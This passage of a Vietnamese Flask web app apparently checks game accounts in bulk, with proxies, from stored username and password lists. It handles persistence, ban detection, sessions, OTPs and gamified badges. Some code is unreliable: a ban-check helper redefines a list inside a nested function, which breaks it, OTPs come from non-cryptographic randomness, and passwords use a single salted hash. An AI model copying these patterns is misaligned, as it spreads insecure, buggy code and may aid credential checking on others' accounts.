        logger.error(f"sqlite_save_storage: {e}")

def sqlite_load():
    """Load từ SQLite vào memory — migrate nếu JSON có sẵn"""
    global USERS, ACC_STORAGE, BANNED_USERS
    # Ưu tiên JSON cũ nếu chưa có SQLite data
    sqlite_users = None
    try:
        with _db_lock:
            conn = sqlite3.connect(SQLITE_FILE, check_same_thread=False, timeout=30.0)
            c = conn.cursor()
            c.execute("SELECT username, data FROM users")
            rows = c.fetchall()
            conn.close()
            if rows:
                sqlite_users = {r[0]: json.loads(r[1]) for r in rows}
    except Exception as e:
        logger.error(f"sqlite_load users: {e}")
    if sqlite_users:
        logger.info(f"📦 Load {len(sqlite_users)} users từ SQLite")
        USERS.clear()
        USERS.update(sqlite_users)
        return True
    return False

def migrate_json_to_sqlite():
    """Migrate web_data.json → SQLite (chạy 1 lần)"""
    if not os.path.exists(DATA_FILE):
        return False
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        sqlite_set("users", data.get("users", {}))
        sqlite_set("generated_keys", data.get("generated_keys", {}))
        sqlite_set("notifications", data.get("notifications", []))
        sqlite_set("shares", data.get("shares", {}))
        sqlite_set("admin_logs", data.get("admin_logs", []))
        sqlite_set("banned_users", list(data.get("banned_users", [])))
        sqlite_set("acc_storage", data.get("acc_storage", []))
        sqlite_set("acc_history", data.get("acc_history", []))
        # Save users table riêng
        for un, u in data.get("users", {}).items():
            try:
                with _db_lock:
                    conn = sqlite3.connect(SQLITE_FILE, check_same_thread=False, timeout=30.0)
                    c = conn.cursor()
                    c.execute("REPLACE INTO users (username, data, updated_at) VALUES (?, ?, ?)",
                              (un, json.dumps(u, ensure_ascii=False), time.time()))
                    conn.commit(); conn.close()
            except: pass
        # Storage table
        for it in data.get("acc_storage", []):
            try:
                with _db_lock:
                    conn = sqlite3.connect(SQLITE_FILE, check_same_thread=False, timeout=30.0)
                    c = conn.cursor()
                    c.execute("REPLACE INTO acc_storage (id, data, added_at) VALUES (?, ?, ?)",
                              (it.get("id", ""), json.dumps(it, ensure_ascii=False),
                               it.get("added_at", time.time())))
                    conn.commit(); conn.close()
            except: pass
        logger.info("✅ Migrated JSON → SQLite")
        # Backup JSON cũ
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        bak = os.path.join(BACKUP_DIR, f"web_data_pre_sqlite_{ts}.json")
        shutil.copy2(DATA_FILE, bak)
        logger.info(f"📦 Backup JSON cũ → {bak}")
        return True
    except Exception as e:
        logger.error(f"Migrate error: {e}"); return False

# ========== CACHE ==========
CACHE_VERSION = "v7_skin_avatar_real"  # 🔧 FIX: bump khi đổi logic

def cache_key(u, p):
    return hashlib.md5(f"{CACHE_VERSION}|{u}|{p}".encode()).hexdigest()

def cache_get(u, p):
    key = cache_key(u, p)
    with _cache_lock:
        item = CHECK_CACHE.get(key)
    if not item: return None
    if time.time() - item.get("ts", 0) > CACHE_TTL:
        with _cache_lock: CHECK_CACHE.pop(key, None)
        return None
    return item.get("result")

def cache_set(u, p, result):
    key = cache_key(u, p)
    with _cache_lock:
        CHECK_CACHE[key] = {"ts": time.time(), "result": result}
    with _cache_lock:
        if len(CHECK_CACHE) > 2000:
            sorted_keys = sorted(CHECK_CACHE.keys(), key=lambda k: CHECK_CACHE[k].get("ts", 0))
            for k in sorted_keys[:500]:
                CHECK_CACHE.pop(k, None)

# ========== BAN CHECK HELPERS ==========
BAN_FIELD_ALIASES = [
    "banned", "isBanned", "is_banned", "isBan", "is_ban",
    "banStatus", "ban_status", "banState", "ban_state",
    "punished", "isPunished", "is_punished", "punish",
    "forbidden", "isForbidden", "is_forbidden",
    "blocked", "isBlocked", "is_blocked",
    "suspended", "isSuspended", "is_suspended",
    "accountStatus", "account_status",
    "banType", "ban_type", "banReason", "ban_reason",
]

BAN_TRUE_VALUES = (True, 1, "1", "true", "TRUE", "True",
                   "yes", "YES", "Yes", "on", "ON",
                   "banned", "BANNED", "Banned",
                   "punished", "PUNISHED", "Punished",
                   "forbidden", "FORBIDDEN", "Forbidden",
                   "blocked", "BLOCKED", "Blocked",
                   "suspended", "SUSPENDED", "Suspended",
                   "ban", "BAN")

def _is_ban_value_true(v):
    if v is None: return False
    if isinstance(v, bool): return v
    if isinstance(v, (int, float)): return v == 1
    if isinstance(v, str): return v.strip() in BAN_TRUE_VALUES
    if isinstance(v, dict):
        for k in ("isBan", "banned", "is_banned", "ban", "status", "isBanned"):
            if k in v and _is_ban_value_true(v[k]): return True
    return False

def _extract_ban_from_dict(obj, depth=0, max_depth=6):
    if depth > max_depth or obj is None: return False, "", ""
    if isinstance(obj, dict):
        for alias in BAN_FIELD_ALIASES:
            if alias in obj:
                v = obj[alias]
                if _is_ban_value_true(v):
                    ban_end = ""; ban_reason = ""
                    for tk in ("unbanTime","unban_time","endTime","end_time",
                               "banEndTime","ban_end_time","expiredAt","expires_at",
                               "releaseTime","release_time"):
                        if tk in obj:
                            ban_end = _safe_fromtimestamp(obj[tk], "%d-%m-%Y %H:%M")
                            if ban_end: break
                    for rk in ("banReason","ban_reason","reason","note","description"):
                        if rk in obj and obj[rk]:
                            ban_reason = str(obj[rk])[:80]; break
                    return True, ban_end, ban_reason
        for k, v in obj.items():
            kl = k.lower()
            if kl in ("bandwidth","banner","urban","banana","abandon","band"): continue
            if isinstance(v, (dict, list)):
                b, e, r = _extract_ban_from_dict(v, depth + 1, max_depth)
                if b: return b, e, r
    elif isinstance(obj, list):
        for it in obj:
            b, e, r = _extract_ban_from_dict(it, depth + 1, max_depth)
            if b: return b, e, r
    return False, "", ""

# ══════════════════════════════════════════════════════════════
# 🆕 HELPER: Check BAN chính xác
# ══════════════════════════════════════════════════════════════
def _is_ban_from_tcp(tcp_result):
    """Check ban chính xác từ kết quả TCP login."""
    if not tcp_result:
        return False, ""
    status = tcp_result.get('status', '')
    detail = tcp_result.get('detail', '')
    
    # LOGIN_FAIL=3 → tài khoản bị khóa
    if 'LOGIN_FAIL=3' in detail or 'LOGIN_FAIL result=3' in detail:
        return True, "Tài khoản bị khóa (LOGIN_FAIL=3)"
    
    # PREPARE_FAIL=101 → tài khoản không tồn tại
    if 'PREPARE_FAIL=101' in detail or 'PREPARE_FAIL result=101' in detail:
        return True, "Tài khoản không tồn tại (PREPARE_FAIL=101)"
    
    # Result code khác
    m = re.search(r'result=(\d+)', detail)
    if m:
        code = int(m.group(1))
        # LOGIN_FAIL: 3=khóa, 16/17=cần verify
        if 'LOGIN_FAIL' in detail and code in (3, 16, 17):
            return True, f"Tài khoản bị hạn chế (code {code})"
    
    return False, ""


def _check_ban_from_response(data, acc_name=""):
    """Check ban từ response account API — mở rộng hơn."""
    if not data:
        return False, ""
    
    ban_flags = []
    ban_reasons = []
    
    # Các trường có thể chứa ban info
    ban_keys = [
        'ban', 'banned', 'isBanned', 'is_banned', 'isBan', 'is_ban',
        'banStatus', 'ban_status', 'banState', 'ban_state',
        'punished', 'isPunished', 'forbidden', 'isForbidden',
        'blocked', 'isBlocked', 'suspended', 'isSuspended',
        'accountStatus', 'account_status', 'status', 'account_state',
        'lockStatus', 'lock_status', 'isLocked', 'is_locked',
        'restricted', 'isRestricted', 'violation', 'isViolation',
    ]
    
    def _walk(obj, depth=0):
        if depth > 8 or obj is None:
            return
        if isinstance(obj, dict):
            for k, v in obj.items():
                kl = k.lower()
                # Check trường ban
                if kl in [bk.lower() for bk in ban_keys]:
                    # Bool true
                    if v is True or v == 1:
                        ban_flags = []
                        ban_flags.append(True)
                        ban_reasons.append(f"{k}=True")
                    # String values
                    elif isinstance(v, str) and v.lower() in (
                        'true','yes','banned','ban','blocked','punished',
                        'forbidden','suspended','locked','restricted','1'
                    ):
                        ban_flags.append(True)
                        ban_reasons.append(f"{k}={v}")
                    # Integer codes
                    elif isinstance(v, int) and v > 0:
                        # Một số API dùng code: 1=ban, 2=ban vĩnh viễn
                        if kl in ('ban','banned','bantype','ban_type'):
                            ban_flags.append(True)
                            ban_reasons.append(f"{k}={v}")
                
                # Đệ quy
                if isinstance(v, (dict, list)):
                    _walk(v, depth + 1)
        elif isinstance(obj, list):
            for item in obj:
                if isinstance(item, (dict, list)):
                    _walk(item, depth + 1)
    
    _walk(data)
    
    if ban_flags:
        # Đếm số flag true
        if sum(1 for x in ban_flags if x) >= 1:
            return True, "; ".join(ban_reasons[:3])
    
    return False, ""


def _check_ban_from_kientuong_v2(data):
    """Check ban từ kientuong API — chi tiết."""
    if not data or not isinstance(data, dict):
        return False, ""
    
    player = data.get("player") or data.get("data") or data
    if not isinstance(player, dict):
        return False, ""
    
    # Các trường ban
    ban_fields = [
        'banInfo', 'ban_info', 'punishInfo', 'punish_info',
        'banStatus', 'ban_status', 'banned', 'isBanned',
        'punishment', 'penalty', 'ban', 'restriction',
        'accountBan', 'account_ban', 'lockStatus', 'lock_status',
    ]
    
    for field in ban_fields:
        if field in player:
            val = player[field]
            if not val:
                continue
            
            # Nếu là dict
            if isinstance(val, dict):
                # Check các trường con
                is_ban = val.get('isBan') or val.get('banned') or val.get('isBanned')
                ban_time = val.get('banTime') or val.get('ban_time')
                unban_time = val.get('unbanTime') or val.get('unban_time')
                reason = val.get('reason') or val.get('banReason')
                
                # Nếu có isBan = true
                if is_ban:
                    return True, reason or "Bị ban theo API kientuong"
                
                # Nếu có banTime + chưa hết hạn
                if ban_time and unban_time:
                    try:
                        ban_ts = int(ban_time) if isinstance(ban_time, (int, str)) else 0
                        unban_ts = int(unban_time) if isinstance(unban_time, (int, str)) else 0
                        now = time.time()
                        # Normalize ms → s
                        while ban_ts > 10_000_000_000: ban_ts //= 1000
                        while unban_ts > 10_000_000_000: unban_ts //= 1000
                        if ban_ts > 0 and now < unban_ts:
                            return True, reason or "Đang trong thời gian ban"
                    except Exception:
                        pass
            
            # Nếu là bool/string
            elif val is True or (isinstance(val, str) and val.lower() in ('true','yes','banned','1')):
                return True, "Bị ban"
    
    return False, ""


def _check_ban_from_weekly_v2(data):
    """Check ban từ weekly profile."""
    if not data or not isinstance(data, dict):
        return False, ""
    
    # Check player_info
    p_info = data.get('player_info') or {}
    if isinstance(p_info, dict):
        for field in ('ban','banned','isBanned','banStatus','ban_status'):
            if p_info.get(field):
                return True, f"Bị ban (weekly {field})"
    
    # Check report
    report = data.get('report') or {}
    if isinstance(report, dict):
        for field in ('ban','banned','isBanned'):
            if report.get(field):
                return True, f"Bị ban (weekly report)"
    
    return False, ""

def _check_ban_from_kientuong(d):
    """🔧 Copy CHÍNH XÁC từ clm.py gốc — check ban chi tiết."""
    if not isinstance(d, dict):
        return False, "", ""
    
    # Lấy player data
    p = d.get("player") or d.get("data") or d
    if not isinstance(p, dict):
        return _extract_ban_from_dict(d)
    
    # Lấy ban_info
    ban_info = (p.get("banInfo") or p.get("ban_info") or
                p.get("punishInfo") or p.get("punish_info") or
                p.get("punishment") or p.get("penalty") or
                p.get("ban") or p.get("restriction") or {})
    
    banned = False
    ban_end_time = None
    ban_reason = None
    
    def _check_ban_from_info(b):
        """🔧 Copy CHÍNH XÁC từ clm.py."""
        nonlocal banned, ban_end_time, ban_reason
        if not b:
            return
        if isinstance(b, dict):
            # Cờ trực tiếp
            if b.get("isBan") or b.get("isBanned") or b.get("banned") or b.get("ban"):
                banned = True
            # Kiểm tra khoảng thời gian (banTime -> unbanTime)
            now_ts = int(time.time())
            ban_at = _norm_unix_ts(b.get("banTime") or b.get("ban_time") or b.get("startTime") or b.get("start_time"))
            unban_at = _norm_unix_ts(b.get("unbanTime") or b.get("unban_time") or b.get("endTime") or b.get("end_time"))
            
            if ban_at and unban_at and ban_at <= now_ts < unban_at:
                banned = True
            elif ban_at and not unban_at and ban_at <= now_ts:
                banned = True
            
            # Lấy thời gian hết ban
            until = (b.get("endTime") or b.get("end_time") or
                     b.get("banEndTime") or b.get("ban_end_time") or
                     b.get("unbanTime") or b.get("unban_time") or
                     b.get("expireAt") or b.get("expiredAt") or
                     b.get("releaseTime") or b.get("release_time"))
            if until:
                ban_end_time = _safe_fromtimestamp(until, "%d-%m-%Y %H:%M")
            
            # Lý do ban
            reason = b.get("reason") or b.get("cause") or b.get("banReason") or b.get("ban_reason") or ""
            if reason:
                ban_reason = str(reason).strip()
        elif isinstance(b, (list, tuple)) and b:
            _check_ban_from_info(b[0])
        elif isinstance(b, bool):
            banned = b
        elif isinstance(b, str):
            banned = b.lower() in ("yes", "true", "banned", "ban", "1")
    
    _check_ban_from_info(ban_info)
    
    # Nếu ban_info rỗng → thử extract từ dict
    if not banned and not ban_info:
        is_b, end_b, reason_b = _extract_ban_from_dict(d)
        if is_b:
            banned = True
            ban_end_time = end_b
            ban_reason = reason_b
    
    return banned, ban_end_time or "", ban_reason or ""


def _check_ban_from_weekly(wd):
    if not isinstance(wd, dict): return False, "", ""
    p_info = wd.get("player_info") or {}
    if isinstance(p_info, dict):
        is_b, end_b, reason_b = _extract_ban_from_dict(p_info)
        if is_b: return is_b, end_b, reason_b
    return _extract_ban_from_dict(wd)

def _check_ban_from_account(ad):
    if not isinstance(ad, dict): return False, "", ""
    user_info = ad.get("user_info") or ad.get("data") or ad
    return _extract_ban_from_dict(user_info)

def _norm_unix_ts(v):
    try: t = int(float(v or 0))
    except Exception: return 0
    if t <= 0: return 0
    while t > 10_000_000_000: t //= 1000
    if t < 0 or t > 32_503_680_000: return 0
    return t

def _safe_fromtimestamp(v, fmt="%d-%m-%Y %H:%M"):
    ts = _norm_unix_ts(v)
    if not ts or ts < 946_684_800: return ""
    try: return datetime.fromtimestamp(ts).strftime(fmt)
    except (OSError, OverflowError, ValueError, TypeError): return ""

# ========== ERROR HANDLER ==========
@app.errorhandler(500)
def internal_error(e):
    logger.error(f"500: {traceback.format_exc()}")
    return render_error_page(), 500

@app.errorhandler(404)
def not_found(e):
    return render_error_page("404 — Trang không tồn tại"), 404

@app.errorhandler(403)
def forbidden(e):
    return render_error_page("403 — Không có quyền"), 403

@app.errorhandler(Exception)
def all_exceptions(e):
    # 🔧 FIX: Không nuốt HTTPException (giữ 404/403/redirect đúng)
    from werkzeug.exceptions import HTTPException
    if isinstance(e, HTTPException):
        return e
    logger.error(f"EXC: {traceback.format_exc()}")
    return render_error_page("500 — Lỗi hệ thống"), 500

def render_error_page(msg="LỖI"):
    return (f'<html><body style="background:#05000e;color:#fff;text-align:center;'
            f'padding:50px;font-family:sans-serif"><h1>⚠️ {msg}</h1>'
            f'<a href="/" style="color:#00f2fe">← TRANG CHỦ</a></body></html>')

# ========== RATE LIMIT ==========
def check_rate_limit(ip):
    now = time.time()
    with _rate_lock:
        q = _rate_store[ip]
        while q and now - q[0] > RATE_LIMIT_WINDOW: q.popleft()
        if len(q) >= RATE_LIMIT_PER_IP: return False
        q.append(now); return True

@app.before_request
def _session_validate_middleware():
    if request.path.startswith("/static") or request.path == "/health": return None
    if "username" not in session: return None
    uname = session.get("username")
    u = USERS.get(uname)
    if not u: session.clear(); return None
    se = session.get("session_epoch", 0); ue = u.get("session_epoch", 0)
    if se and ue and se != ue:
        reason = u.get("force_logout_reason", "Tài khoản đã được đổi thông tin")
        session.clear(); flash(f"⚠️ {reason}", "error")
        return redirect(url_for("login_page"))
    return None

@app.before_request
def _rate_limit_middleware():
    if request.path in ("/health",) or request.path.startswith("/static"): return None
    # 🔧 FIX: Chỉ tin X-Forwarded-For khi có TRUSTED_PROXY
    if os.environ.get("TRUSTED_PROXY", "").lower() in ("1", "true", "yes"):
        ip = request.headers.get("X-Forwarded-For", "").split(",")[0].strip()
    else:
        ip = ""
    ip = ip or request.remote_addr or "unknown"
    if not check_rate_limit(ip):
        return Response("⚠️ Bạn thao tác quá nhanh. Vui lòng đợi vài giây!", status=429)
    return None
# ========== SAVE DATA (FIX RACE CONDITION #5) ==========
def save_data(force=False):
    now = time.time()
    with _save_lock:
        if not force and (now - _save_last[0] < SAVE_DEBOUNCE_SEC):
            _save_dirty[0] = True; return
        _save_last[0] = now; _save_dirty[0] = False
    # 🆕 FIX: dùng non-blocking lock — chỉ 1 thread save tại 1 thời điểm
    if not _save_thread_lock.acquire(blocking=False):
        _save_dirty[0] = True
        return
    def _wrapper():
        try:
            _do_save_async()
        finally:
            _save_thread_lock.release()
    threading.Thread(target=_wrapper, daemon=True).start()

def _do_save_async():
    try:
        with _lock:
            data = {"users": USERS, "generated_keys": GENERATED_KEYS,
                    "notifications": NOTIFICATIONS[-100:],
                    "shares": dict(list(SHARES.items())[-500:]),
                    "admin_logs": ADMIN_LOGS[-500:],
                    "banned_users": list(BANNED_USERS),
                    "acc_storage": ACC_STORAGE[-3000:],
                    "acc_history": ACC_HISTORY[-500:]}
            with open(DATA_TMP_FILE, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, separators=(",", ":"))
                f.flush()
                # 🔧 FIX: fsync để đảm bảo dữ liệu xuống disk
                try: os.fsync(f.fileno())
                except Exception: pass
            if os.path.exists(DATA_FILE) and os.path.getsize(DATA_FILE) > 0:
                try: shutil.copy2(DATA_FILE, DATA_BACKUP_FILE)
                except: pass
            os.replace(DATA_TMP_FILE, DATA_FILE)
        # 🆕 v7.0: Đồng thời save SQLite
        sqlite_save_users()
        sqlite_save_storage()
    except Exception as e:
        logger.error(f"Save error: {e}")

def _save_daemon():
    while True:
        time.sleep(SAVE_DEBOUNCE_SEC + 1)
        with _save_lock:
            if _save_dirty[0]:
                _save_dirty[0] = False; _save_last[0] = time.time()
                threading.Thread(target=_do_save_async, daemon=True).start()

def save_jobs(force=False):
    now = time.time()
    with _jobs_save_lock:
        if not force and (now - _jobs_save_last[0] < JOBS_SAVE_DEBOUNCE_SEC): return
        _jobs_save_last[0] = now
    try:
        cj = {}
        for jid, j in CHECK_JOBS.items():
            if not j.get("done") and not j.get("cancelled"):
                cj[jid] = {"id": j.get("id"), "user": j.get("user"),
                    "total": j.get("total"), "current": j.get("current"),
                    "progress": j.get("progress"), "done": False, "cancelled": False,
                    "current_acc": j.get("current_acc", ""),
                    "acc_list": j.get("acc_list", []), "proxy": j.get("proxy"),
                    "logs": j.get("logs", [])[-30:], "stats": j.get("stats", {}),
                    "summary": j.get("summary", ""),
                    "started_at": j.get("started_at", time.time()), "type": "check_file"}
        sj = {}
        for jid, j in STORAGE_JOBS.items():
            if not j.get("done") and not j.get("cancelled"):
                sj[jid] = {"id": j.get("id"), "admin": j.get("admin"),
                    "total": j.get("total"), "current": j.get("current"),
                    "progress": j.get("progress"), "done": False, "cancelled": False,
                    "current_acc": j.get("current_acc", ""),
                    "logs": j.get("logs", [])[-30:], "passed": j.get("passed", 0),
                    "banned": j.get("banned", 0), "failed": j.get("failed", 0),
                    "summary": j.get("summary", ""),
                    "started": j.get("started", time.time()), "type": "up_acc"}
        payload = {"check_jobs": cj, "storage_jobs": sj, "ts": time.time()}
        # 🔧 FIX: atomic write + fsync
        with open(JOBS_TMP_FILE, "w", encoding="utf-8") as f:
            json.dump(payload, f, ensure_ascii=False, separators=(",", ":"))
            f.flush()
            try: os.fsync(f.fileno())
            except Exception: pass
        os.replace(JOBS_TMP_FILE, JOBS_FILE)
    except Exception as e:
        logger.error(f"Save jobs error: {e}")

def _jobs_save_daemon():
    while True:
        time.sleep(5)
        try: save_jobs(force=True)
        except Exception as e: logger.error(f"Jobs daemon: {e}")

def load_jobs():
    if not os.path.exists(JOBS_FILE): return
    try:
        with open(JOBS_FILE, "r", encoding="utf-8") as f: data = json.load(f)
    except Exception as e:
        logger.error(f"Load jobs: {e}"); return
    cj = data.get("check_jobs", {}); sj = data.get("storage_jobs", {})
    if not cj and not sj: return
    logger.info(f"🔁 Khôi phục {len(cj)} check_jobs + {len(sj)} storage_jobs")
    for jid, j in cj.items():
        j["queued"] = False; j["cancelled"] = False; CHECK_JOBS[jid] = j
    for jid, j in sj.items():
        j["cancelled"] = False; STORAGE_JOBS[jid] = j
    save_jobs(force=True)

def auto_backup_worker():
    while True:
        try:
            time.sleep(AUTO_BACKUP_INTERVAL)
            if os.path.exists(DATA_FILE):
                ts = datetime.now().strftime('%Y%m%d_%H%M%S')
                dst = os.path.join(BACKUP_DIR, f"web_data_{ts}.json")
                shutil.copy2(DATA_FILE, dst)
                files = sorted([f for f in os.listdir(BACKUP_DIR) if f.startswith("web_data_")])
                if len(files) > 48:
                    for old in files[:-48]:
                        try: os.remove(os.path.join(BACKUP_DIR, old))
                        except: pass
        except Exception as e: logger.error(f"Backup error: {e}")

def load_data():
    global USERS, GENERATED_KEYS, NOTIFICATIONS, SHARES, ADMIN_LOGS, BANNED_USERS, ACC_STORAGE, ACC_HISTORY
    # 🆕 v7.0: Thử load SQLite trước
    init_sqlite()
    if sqlite_load():
        # Load các phần còn lại từ kv_store
        GENERATED_KEYS = sqlite_get("generated_keys") or {}
        NOTIFICATIONS = sqlite_get("notifications") or []
        SHARES = sqlite_get("shares") or {}
        ADMIN_LOGS = sqlite_get("admin_logs") or []
        BANNED_USERS = set(sqlite_get("banned_users") or [])
        ACC_STORAGE = sqlite_get("acc_storage") or []
        ACC_HISTORY = sqlite_get("acc_history") or []
        logger.info(f"✅ Loaded from SQLite: {len(USERS)} users, {len(ACC_STORAGE)} accs")
    else:
        # Fallback: JSON cũ
        data = None
        for fname in (DATA_FILE, DATA_BACKUP_FILE):
            if not os.path.exists(fname): continue
            try:
                if os.path.getsize(fname) == 0: continue
                with open(fname, "r", encoding="utf-8") as f: data = json.load(f)
                break
            except: data = None
        if data is not None:
            USERS = data.get("users", {}); GENERATED_KEYS = data.get("generated_keys", {})
            NOTIFICATIONS = data.get("notifications", []); SHARES = data.get("shares", {})
            ADMIN_LOGS = data.get("admin_logs", [])
            BANNED_USERS = set(data.get("banned_users", []))
            ACC_STORAGE = data.get("acc_storage", [])
            ACC_HISTORY = data.get("acc_history", [])
            # Migrate lên SQLite
            migrate_json_to_sqlite()
    # Init fields cho user cũ
    for un, u in USERS.items():
        if "otp_pending" not in u: u["otp_pending"] = ""
        if "otp_sent_at" not in u: u["otp_sent_at"] = 0
        if "badges" not in u: u["badges"] = []
        if "accent" not in u: u["accent"] = "cyan"
        if "streak_data" not in u: u["streak_data"] = {"current": 0, "last": 0, "best": 0}
        if "daily_quests" not in u: u["daily_quests"] = {}
        if "vouchers" not in u: u["vouchers"] = []
        if "ad_watches" not in u: u["ad_watches"] = {}
        if "slot_stats" not in u: u["slot_stats"] = {"plays": 0, "biggest_win": 0}

# ========== SECURE CONFIG ==========
def _get_sec_cfg(env_var: str, enc_default: bytes = b"") -> str:
    """🔒 Chỉ đọc ENV. Không fallback base64 (tránh lộ secrets)."""
    val = os.environ.get(env_var)
    return val.strip() if val and val.strip() else ""

def get_telegram_config():
    if os.path.exists(DATA_JSON_PATH):
        try:
            with open(DATA_JSON_PATH, "r", encoding="utf-8") as f:
                cfg = json.load(f)
                bt = str(cfg.get("bot_token", "")).strip()
                ci = str(cfg.get("chat_id", "")).strip()
                if bt or ci: return bt, ci
        except Exception as e: logger.error(f"[Config] {e}")
    return (_get_sec_cfg("TELEGRAM_BOT_TOKEN", _DEFAULT_BOT_TOKEN_ENC),
            _get_sec_cfg("TELEGRAM_CHAT_ID", _DEFAULT_CHAT_ID_ENC))

def save_telegram_config(bot_token: str, chat_id: str):
    data = {"bot_token": bot_token.strip(), "chat_id": chat_id.strip(),
            "updated_at": time.strftime("%Y-%m-%d %H:%M:%S")}
    with open(DATA_JSON_PATH, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)
    return data

# ========== AUTH HELPERS ==========
def gen_id(): return "AOV-" + uuid.uuid4().hex[:4].upper() + "-" + uuid.uuid4().hex[:4].upper()
def hash_password(p): return hashlib.sha256((p + APP_SECRET).encode()).hexdigest()

def login_required(f):
    @wraps(f)
    def deco(*a, **k):
        if "username" not in session or session["username"] not in USERS:
            session.pop("username", None); return redirect(url_for("login_page"))
        if session["username"] in BANNED_USERS:
            session.pop("username", None); flash("Tài khoản đã bị ban!", "error")
            return redirect(url_for("login_page"))
        return f(*a, **k)
    return deco

def get_user():
    if "username" not in session: return None
    return USERS.get(session["username"])

def is_owner(username=None):
    if username is None: username = session.get("username", "")
    return username == OWNER_USERNAME

def is_qtv(username=None):
    if username is None: username = session.get("username", "")
    u = USERS.get(username)
    return bool(u and u.get("is_qtv"))

def can_up_acc(username=None): return is_owner(username) or is_qtv(username)

def get_role_badge(username=None):
    if username is None: username = session.get("username", "")
    if is_owner(username): return "🥇 OWNER", "#ffb800"
    u = USERS.get(username)
    if u and u.get("is_qtv"): return "👑 QTV", "#00f0ff"
    return "👤 USER", "#8b8b9a"

def owner_required(f):
    @wraps(f)
    def deco(*a, **k):
        if "username" not in session: return redirect(url_for("login_page"))
        if not is_owner():
            flash("Chỉ OWNER mới có quyền!", "error"); return redirect(url_for("check_page"))
        return f(*a, **k)
    return deco

def admin_or_qtv_required(f):
    @wraps(f)
    def deco(*a, **k):
        if "username" not in session: return redirect(url_for("login_page"))
        if not (is_owner() or is_qtv()):
            flash("Không có quyền!", "error"); return redirect(url_for("check_page"))
        return f(*a, **k)
    return deco

def invalidate_user_sessions(username):
    u = USERS.get(username)
    if not u: return
    u["session_epoch"] = int(time.time() * 1000)
    u["force_logout_at"] = time.time()
    u["force_logout_reason"] = "Tài khoản đã được đổi thông tin. Vui lòng đăng nhập lại!"

def gen_otp(username, action="change"):
    code = "".join(random.choices(string.digits, k=OTP_LENGTH))
    with _otp_lock:
        OTP_STORE[username] = {"code": code, "action": action,
            "expire": time.time() + OTP_EXPIRE_SEC, "created": time.time()}
    return code

def verify_otp(username, code):
    with _otp_lock: item = OTP_STORE.get(username)
    if not item: return False, "Chưa có mã xác thực"
    if time.time() > item.get("expire", 0): return False, "Mã đã hết hạn"
    if str(code).strip() != item.get("code"): return False, "Mã không đúng"
    with _otp_lock: OTP_STORE.pop(username, None)
    return True, "OK"

def unread_count():
    u = get_user()
    if not u: return 0
    username = u.get("username", ""); now = time.time()
    with _unread_lock:
        item = _unread_cache.get(username)
        if item and now - item[0] < 5: return item[1]
    lr = u.get("last_notif_read", 0)
    cnt = sum(1 for n in NOTIFICATIONS if n.get("timestamp", 0) > lr)
    with _unread_lock: _unread_cache[username] = (now, cnt)
    return cnt

def mark_read():
    u = get_user()
    if u: u["last_notif_read"] = time.time(); save_data()

def log_admin(action, target="", detail=""):
    ADMIN_LOGS.append({"id": uuid.uuid4().hex[:10], "admin": session.get("username", "?"),
        "action": action, "target": target, "detail": detail,
        "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "timestamp": time.time()})
    if len(ADMIN_LOGS) > 500: ADMIN_LOGS.pop(0)

def add_exp(user, amount):
    if "level" not in user: user["level"] = 1
    if "exp" not in user: user["exp"] = 0
    user["exp"] += amount
    while user["exp"] >= user["level"] * LEVEL_UP_BASE:
        user["exp"] -= user["level"] * LEVEL_UP_BASE
        user["level"] += 1; user["balance"] += 5

# ============================================================
# 🆕 v7.0: BADGES SYSTEM (#15)
# ============================================================
def award_badge(user, badge_id):
    """Trao huy hiệu cho user nếu chưa có"""
    if badge_id not in BADGE_DEFS: return False
    if "badges" not in user: user["badges"] = []
    if badge_id in user["badges"]: return False
    user["badges"].append(badge_id)
    # Lưu vào SQLite
    try:
        with _db_lock:
            conn = sqlite3.connect(SQLITE_FILE, check_same_thread=False, timeout=30.0)
            c = conn.cursor()
            c.execute("REPLACE INTO badges (username, badge_id, earned_at) VALUES (?, ?, ?)",
                      (user.get("username", ""), badge_id, time.time()))
            conn.commit(); conn.close()
    except: pass
    # Thông báo
    bd = BADGE_DEFS[badge_id]
    NOTIFICATIONS.append({"id": uuid.uuid4().hex[:10],
        "title": f"{bd['icon']} Huy hiệu mới: {bd['name_vi']}",
        "content": f"Chúc mừng! Bạn đã nhận huy hiệu **{bd['name_vi']}**\n{bd['desc_vi']}",
        "admin": "SYSTEM", "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "timestamp": time.time()})
    return True

def check_badge_conditions(user):
    """Auto check và trao huy hiệu dựa trên stats"""
    # first_check
    if user.get("mission", {}).get("total_acc", 0) >= 1:
        award_badge(user, "first_check")
    # hunter_sss
    if user.get("mission", {}).get("sss", 0) >= 10:
        award_badge(user, "hunter_sss")
    # hunter_anime
    if user.get("mission", {}).get("anime", 0) >= 5:
        award_badge(user, "hunter_anime")
    # taixiu_king
    if user.get("game_stats", {}).get("total_win", 0) >= 50:
        award_badge(user, "taixiu_king")
    # rich_man
    if user.get("balance", 0) >= 10000:
        award_badge(user, "rich_man")
    # checker_pro
    if user.get("mission", {}).get("total_acc", 0) >= 100:
        award_badge(user, "checker_pro")
    # streak_7
    if user.get("streak_data", {}).get("best", 0) >= 7:
        award_badge(user, "streak_7")
    # lucky_wheel
    if user.get("game_stats", {}).get("biggest_win", 0) >= 500:
        award_badge(user, "lucky_wheel")
    # social_butter
    if user.get("chat_count", 0) >= 100:
        award_badge(user, "social_butter")
    # veteran
    if user.get("created_at", 0) and (time.time() - user["created_at"]) >= 30 * 86400:
        award_badge(user, "veteran")

# ============================================================
# 🆕 v7.0: DAILY QUEST (#32)
# ============================================================
def _reset_daily_quests(user):
    today = datetime.now().strftime("%Y-%m-%d")
    dq = user.get("daily_quests", {})
    if dq.get("date") != today:
        # Random 3 quest
        picked = random.sample(DAILY_QUEST_TEMPLATES, 3)
        user["daily_quests"] = {
            "date": today,
            "quests": {q["id"]: {"progress": 0, "target": q["target"],
                                  "reward": q["reward"], "claimed": False}
                       for q in picked},
            "defs": {q["id"]: q for q in picked}
        }

def quest_add_progress(user, quest_type, amount=1):
    """Cộng progress cho quest"""
    _reset_daily_quests(user)
    dq = user["daily_quests"]
    for qid, q in dq["quests"].items():
        qdef = dq["defs"].get(qid, {})
        if qdef.get("type") == quest_type and not q["claimed"]:
            q["progress"] = min(q["target"], q["progress"] + amount)

